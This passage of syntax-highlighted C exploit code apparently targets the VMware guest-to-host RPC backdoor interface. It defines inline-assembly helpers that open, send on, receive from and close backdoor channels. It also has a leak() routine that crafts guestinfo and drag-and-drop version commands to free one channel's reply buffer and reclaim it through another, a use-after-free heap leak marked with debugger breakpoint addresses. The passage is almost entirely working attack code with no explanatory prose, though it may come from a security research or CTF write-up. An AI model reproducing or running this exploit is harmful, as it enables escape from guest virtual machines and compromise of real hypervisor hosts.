punctuation">,</span><span class="token string">"%r12"</span>        <span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">void</span> <span class="token function">channel_recv_reply_len</span><span class="token punctuation">(</span><span class="token keyword">int</span> cookie1<span class="token punctuation">,</span><span class="token keyword">int</span> cookie2<span class="token punctuation">,</span><span class="token keyword">int</span> channel_num<span class="token punctuation">,</span><span class="token keyword">int</span> <span class="token operator">*</span>len<span class="token punctuation">,</span><span class="token keyword">int</span> <span class="token operator">*</span>res<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">asm</span><span class="token punctuation">(</span><span class="token string">"movl %%eax,%%ebx\n\t"</span>        <span class="token string">"movq %%r8,%%r10\n\t"</span>        <span class="token string">"movq %%rcx,%%r11\n\t"</span>        <span class="token string">"movl $0x564d5868,%%eax\n\t"</span>        <span class="token string">"movl $0x0003001e,%%ecx\n\t"</span>        <span class="token string">"movw $0x5658,%%dx\n\t"</span>        <span class="token string">"out %%eax,%%dx\n\t"</span>        <span class="token string">"movl %%ecx,(%%r10)\n\t"</span>        <span class="token string">"movl %%ebx,(%%r11)\n\t"</span>        <span class="token operator">:</span>        <span class="token operator">:</span>        <span class="token operator">:</span><span class="token string">"%rax"</span><span class="token punctuation">,</span><span class="token string">"%rbx"</span><span class="token punctuation">,</span><span class="token string">"%rcx"</span><span class="token punctuation">,</span><span class="token string">"%rdx"</span><span class="token punctuation">,</span><span class="token string">"%rsi"</span><span class="token punctuation">,</span><span class="token string">"%rdi"</span><span class="token punctuation">,</span><span class="token string">"%r10"</span><span class="token punctuation">,</span><span class="token string">"%r11"</span>       <span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">void</span> <span class="token function">channel_recv_data</span><span class="token punctuation">(</span><span class="token keyword">int</span> cookie1<span class="token punctuation">,</span><span class="token keyword">int</span> cookie2<span class="token punctuation">,</span><span class="token keyword">int</span> channel_num<span class="token punctuation">,</span><span class="token keyword">int</span> offset<span class="token punctuation">,</span><span class="token keyword">char</span> <span class="token operator">*</span>data<span class="token punctuation">,</span><span class="token keyword">int</span> <span class="token operator">*</span>res<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">asm</span><span class="token punctuation">(</span><span class="token string">"pushq %%rbp\n\t"</span>        <span class="token string">"movq %%r9,%%r10\n\t"</span>        <span class="token string">"movq %%r8,%%rbp\n\t"</span>        <span class="token string">"movq %%rcx,%%r11\n\t"</span>        <span class="token string">"movq $1,%%rbx\n\t"</span>        <span class="token string">"movl $0x564d5868,%%eax\n\t"</span>        <span class="token string">"movl $0x0004001e,%%ecx\n\t"</span>        <span class="token string">"movw $0x5658,%%dx\n\t"</span>        <span class="token string">"in %%dx,%%eax\n\t"</span>        <span class="token string">"add %%r11,%%rbp\n\t"</span>        <span class="token string">"movl %%ebx,(%%rbp)\n\t"</span>        <span class="token string">"movl %%ecx,(%%r10)\n\t"</span>        <span class="token string">"popq %%rbp\n\t"</span>        <span class="token operator">:</span>        <span class="token operator">:</span>        <span class="token operator">:</span><span class="token string">"%rax"</span><span class="token punctuation">,</span><span class="token string">"%rbx"</span><span class="token punctuation">,</span><span class="token string">"%rcx"</span><span class="token punctuation">,</span><span class="token string">"%rdx"</span><span class="token punctuation">,</span><span class="token string">"%rsi"</span><span class="token punctuation">,</span><span class="token string">"%rdi"</span><span class="token punctuation">,</span><span class="token string">"%r10"</span><span class="token punctuation">,</span><span class="token string">"%r11"</span><span class="token punctuation">,</span><span class="token string">"%r12"</span>       <span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">void</span> <span class="token function">channel_recv_finish</span><span class="token punctuation">(</span><span class="token keyword">int</span> cookie1<span class="token punctuation">,</span><span class="token keyword">int</span> cookie2<span class="token punctuation">,</span><span class="token keyword">int</span> channel_num<span class="token punctuation">,</span><span class="token keyword">int</span> <span class="token operator">*</span>res<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">asm</span><span class="token punctuation">(</span><span class="token string">"movl %%eax,%%ebx\n\t"</span>        <span class="token string">"movq %%rcx,%%r10\n\t"</span>        <span class="token string">"movq $0x1,%%rbx\n\t"</span>        <span class="token string">"movl $0x564d5868,%%eax\n\t"</span>        <span class="token string">"movl $0x0005001e,%%ecx\n\t"</span>        <span class="token string">"movw $0x5658,%%dx\n\t"</span>        <span class="token string">"out %%eax,%%dx\n\t"</span>        <span class="token string">"movl %%ecx,(%%r10)\n\t"</span>        <span class="token operator">:</span>        <span class="token operator">:</span>        <span class="token operator">:</span><span class="token string">"%rax"</span><span class="token punctuation">,</span><span class="token string">"%rbx"</span><span class="token punctuation">,</span><span class="token string">"%rcx"</span><span class="token punctuation">,</span><span class="token string">"%rdx"</span><span class="token punctuation">,</span><span class="token string">"%rsi"</span><span class="token punctuation">,</span><span class="token string">"%rdi"</span><span class="token punctuation">,</span><span class="token string">"%r10"</span>       <span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">void</span> <span class="token function">channel_recv_finish2</span><span class="token punctuation">(</span><span class="token keyword">int</span> cookie1<span class="token punctuation">,</span><span class="token keyword">int</span> cookie2<span class="token punctuation">,</span><span class="token keyword">int</span> channel_num<span class="token punctuation">,</span><span class="token keyword">int</span> <span class="token operator">*</span>res<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">asm</span><span class="token punctuation">(</span><span class="token string">"movl %%eax,%%ebx\n\t"</span>        <span class="token string">"movq %%rcx,%%r10\n\t"</span>        <span class="token string">"movq $0x21,%%rbx\n\t"</span>        <span class="token string">"movl $0x564d5868,%%eax\n\t"</span>        <span class="token string">"movl $0x0005001e,%%ecx\n\t"</span>        <span class="token string">"movw $0x5658,%%dx\n\t"</span>        <span class="token string">"out %%eax,%%dx\n\t"</span>        <span class="token string">"movl %%ecx,(%%r10)\n\t"</span>        <span class="token operator">:</span>        <span class="token operator">:</span>        <span class="token operator">:</span><span class="token string">"%rax"</span><span class="token punctuation">,</span><span class="token string">"%rbx"</span><span class="token punctuation">,</span><span class="token string">"%rcx"</span><span class="token punctuation">,</span><span class="token string">"%rdx"</span><span class="token punctuation">,</span><span class="token string">"%rsi"</span><span class="token punctuation">,</span><span class="token string">"%rdi"</span><span class="token punctuation">,</span><span class="token string">"%r10"</span>       <span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">void</span> <span class="token function">channel_close</span><span class="token punctuation">(</span><span class="token keyword">int</span> cookie1<span class="token punctuation">,</span><span class="token keyword">int</span> cookie2<span class="token punctuation">,</span><span class="token keyword">int</span> channel_num<span class="token punctuation">,</span><span class="token keyword">int</span> <span class="token operator">*</span>res<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">asm</span><span class="token punctuation">(</span><span class="token string">"movl %%eax,%%ebx\n\t"</span>        <span class="token string">"movq %%rcx,%%r10\n\t"</span>        <span class="token string">"movl $0x564d5868,%%eax\n\t"</span>        <span class="token string">"movl $0x0006001e,%%ecx\n\t"</span>        <span class="token string">"movw $0x5658,%%dx\n\t"</span>        <span class="token string">"out %%eax,%%dx\n\t"</span>        <span class="token string">"movl %%ecx,(%%r10)\n\t"</span>        <span class="token operator">:</span>        <span class="token operator">:</span>        <span class="token operator">:</span><span class="token string">"%rax"</span><span class="token punctuation">,</span><span class="token string">"%rbx"</span><span class="token punctuation">,</span><span class="token string">"%rcx"</span><span class="token punctuation">,</span><span class="token string">"%rdx"</span><span class="token punctuation">,</span><span class="token string">"%rsi"</span><span class="token punctuation">,</span><span class="token string">"%rdi"</span><span class="token punctuation">,</span><span class="token string">"%r10"</span>       <span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">struct</span> <span class="token class-name">channel</span><span class="token punctuation">&#123;</span>    <span class="token keyword">int</span> cookie1<span class="token punctuation">;</span>    <span class="token keyword">int</span> cookie2<span class="token punctuation">;</span>    <span class="token keyword">int</span> num<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token class-name">uint64_t</span> heap <span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span><span class="token class-name">uint64_t</span> text <span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span><span class="token keyword">void</span> <span class="token function">run_cmd</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span>cmd<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">struct</span> <span class="token class-name">channel</span> tmp<span class="token punctuation">;</span>    <span class="token keyword">int</span> res<span class="token punctuation">,</span>len<span class="token punctuation">,</span>i<span class="token punctuation">;</span>    <span class="token keyword">char</span> <span class="token operator">*</span>data<span class="token punctuation">;</span>    <span class="token function">channel_open</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>tmp<span class="token punctuation">.</span>cookie1<span class="token punctuation">,</span><span class="token operator">&amp;</span>tmp<span class="token punctuation">.</span>cookie2<span class="token punctuation">,</span><span class="token operator">&amp;</span>tmp<span class="token punctuation">.</span>num<span class="token punctuation">,</span><span class="token operator">&amp;</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>res<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"fail to open channel!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">channel_set_len</span><span class="token punctuation">(</span>tmp<span class="token punctuation">.</span>cookie1<span class="token punctuation">,</span>tmp<span class="token punctuation">.</span>cookie2<span class="token punctuation">,</span>tmp<span class="token punctuation">.</span>num<span class="token punctuation">,</span><span class="token function">strlen</span><span class="token punctuation">(</span>cmd<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>res<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"fail to set len\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">channel_send_data</span><span class="token punctuation">(</span>tmp<span class="token punctuation">.</span>cookie1<span class="token punctuation">,</span>tmp<span class="token punctuation">.</span>cookie2<span class="token punctuation">,</span>tmp<span class="token punctuation">.</span>num<span class="token punctuation">,</span><span class="token function">strlen</span><span class="token punctuation">(</span>cmd<span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">0x10</span><span class="token punctuation">,</span>cmd<span class="token punctuation">,</span><span class="token operator">&amp;</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">channel_recv_reply_len</span><span class="token punctuation">(</span>tmp<span class="token punctuation">.</span>cookie1<span class="token punctuation">,</span>tmp<span class="token punctuation">.</span>cookie2<span class="token punctuation">,</span>tmp<span class="token punctuation">.</span>num<span class="token punctuation">,</span><span class="token operator">&amp;</span>len<span class="token punctuation">,</span><span class="token operator">&amp;</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>res<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"fail to recv data len\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"recv len:%d\n"</span><span class="token punctuation">,</span>len<span class="token punctuation">)</span><span class="token punctuation">;</span>    data <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span>len<span class="token operator">+</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">memset</span><span class="token punctuation">(</span>data<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span>len<span class="token operator">+</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span>i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span>len<span class="token operator">+</span><span class="token number">0x10</span><span class="token punctuation">;</span>i<span class="token operator">+=</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">channel_recv_data</span><span class="token punctuation">(</span>tmp<span class="token punctuation">.</span>cookie1<span class="token punctuation">,</span>tmp<span class="token punctuation">.</span>cookie2<span class="token punctuation">,</span>tmp<span class="token punctuation">.</span>num<span class="token punctuation">,</span>i<span class="token punctuation">,</span>data<span class="token punctuation">,</span><span class="token operator">&amp;</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"recv data:%s\n"</span><span class="token punctuation">,</span>data<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">channel_recv_finish</span><span class="token punctuation">(</span>tmp<span class="token punctuation">.</span>cookie1<span class="token punctuation">,</span>tmp<span class="token punctuation">.</span>cookie2<span class="token punctuation">,</span>tmp<span class="token punctuation">.</span>num<span class="token punctuation">,</span><span class="token operator">&amp;</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>res<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"fail to recv finish\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">channel_close</span><span class="token punctuation">(</span>tmp<span class="token punctuation">.</span>cookie1<span class="token punctuation">,</span>tmp<span class="token punctuation">.</span>cookie2<span class="token punctuation">,</span>tmp<span class="token punctuation">.</span>num<span class="token punctuation">,</span><span class="token operator">&amp;</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>res<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"fail to close channel\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">void</span> <span class="token function">leak</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">struct</span> <span class="token class-name">channel</span> chan<span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> res<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> len<span class="token punctuation">,</span>i<span class="token punctuation">;</span>      <span class="token keyword">char</span> pay<span class="token punctuation">[</span><span class="token number">8192</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">char</span> <span class="token operator">*</span>s1 <span class="token operator">=</span> <span class="token string">"info-set guestinfo.a AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"</span><span class="token punctuation">;</span>    <span class="token keyword">char</span> <span class="token operator">*</span>data<span class="token punctuation">;</span>    <span class="token keyword">char</span> <span class="token operator">*</span>s2 <span class="token operator">=</span> <span class="token string">"info-get guestinfo.a"</span><span class="token punctuation">;</span>    <span class="token keyword">char</span> <span class="token operator">*</span>s21<span class="token operator">=</span> <span class="token string">"info-get guestinfo.a AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"</span><span class="token punctuation">;</span>    <span class="token keyword">char</span> <span class="token operator">*</span>s3 <span class="token operator">=</span> <span class="token string">"1 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"</span><span class="token punctuation">;</span>    <span class="token keyword">char</span> <span class="token operator">*</span>s4 <span class="token operator">=</span> <span class="token string">"tools.capability.dnd_version 4"</span><span class="token punctuation">;</span>    <span class="token keyword">char</span> <span class="token operator">*</span>s5 <span class="token operator">=</span> <span class="token string">"vmx.capability.dnd_version"</span><span class="token punctuation">;</span>    <span class="token comment">//init data</span>    <span class="token function">run_cmd</span><span class="token punctuation">(</span>s1<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// set the message len to be 0x100, so when we call info-get ,we will call malloc(0x100);</span>    <span class="token function">run_cmd</span><span class="token punctuation">(</span>s4<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">//first step </span>    <span class="token function">channel_open</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie1<span class="token punctuation">,</span><span class="token operator">&amp;</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie2<span class="token punctuation">,</span><span class="token operator">&amp;</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>num<span class="token punctuation">,</span><span class="token operator">&amp;</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>res<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"fail to open channel!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">channel_set_len</span><span class="token punctuation">(</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie1<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie2<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>num<span class="token punctuation">,</span><span class="token function">strlen</span><span class="token punctuation">(</span>s21<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//strlen(s21) = 0x100</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>res<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"fail to set len\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">channel_send_data</span><span class="token punctuation">(</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie1<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie2<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>num<span class="token punctuation">,</span><span class="token function">strlen</span><span class="token punctuation">(</span>s21<span class="token punctuation">)</span><span class="token punctuation">,</span>s2<span class="token punctuation">,</span><span class="token operator">&amp;</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">channel_recv_reply_len</span><span class="token punctuation">(</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie1<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie2<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>num<span class="token punctuation">,</span><span class="token operator">&amp;</span>len<span class="token punctuation">,</span><span class="token operator">&amp;</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>res<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"fail to recv data len\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"recv len:%d\n"</span><span class="token punctuation">,</span>len<span class="token punctuation">)</span><span class="token punctuation">;</span>    data <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span>len<span class="token operator">+</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">memset</span><span class="token punctuation">(</span>data<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span>len<span class="token operator">+</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span>i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span>len<span class="token operator">+</span><span class="token number">0x10</span><span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">channel_recv_data</span><span class="token punctuation">(</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie1<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie2<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>num<span class="token punctuation">,</span>i<span class="token punctuation">,</span>data<span class="token punctuation">,</span><span class="token operator">&amp;</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"recv data:%s\n"</span><span class="token punctuation">,</span>data<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">//second step free the reply and let the other channel get it.</span>    <span class="token function">channel_open</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>chan<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie1<span class="token punctuation">,</span><span class="token operator">&amp;</span>chan<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie2<span class="token punctuation">,</span><span class="token operator">&amp;</span>chan<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>num<span class="token punctuation">,</span><span class="token operator">&amp;</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>res<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"fail to open channel!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">channel_set_len</span><span class="token punctuation">(</span>chan<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie1<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie2<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>num<span class="token punctuation">,</span><span class="token function">strlen</span><span class="token punctuation">(</span>s2<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>res<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"fail to set len\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">channel_send_data</span><span class="token punctuation">(</span>chan<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie1<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie2<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>num<span class="token punctuation">,</span><span class="token function">strlen</span><span class="token punctuation">(</span>s2<span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">4</span><span class="token punctuation">,</span>s2<span class="token punctuation">,</span><span class="token operator">&amp;</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>res<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"fail to send data\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">//free the output buffer</span>    <span class="token comment">//printf("Freeing the buffer....,bp:0x5555556DD3EF\n");</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"now let's free\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">channel_set_len</span><span class="token punctuation">(</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie1<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie2<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>num<span class="token punctuation">,</span><span class="token number">0xffff</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>res<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"fail to recv finish1\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"then alloc channel 1\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">//finished sending the command, should get the freed buffer</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Finishing sending the buffer , should allocate the buffer..,bp:0x5555556DD5BC\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">channel_send_data</span><span class="token punctuation">(</span>chan<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie1<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie2<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>num<span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>s2<span class="token punctuation">[</span><span class="token number">16</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>res<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"fail to send data\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"check if channel 1's buffer == channel 0's buffer\n"</span><span class="token punctuation">)</span><span class="token 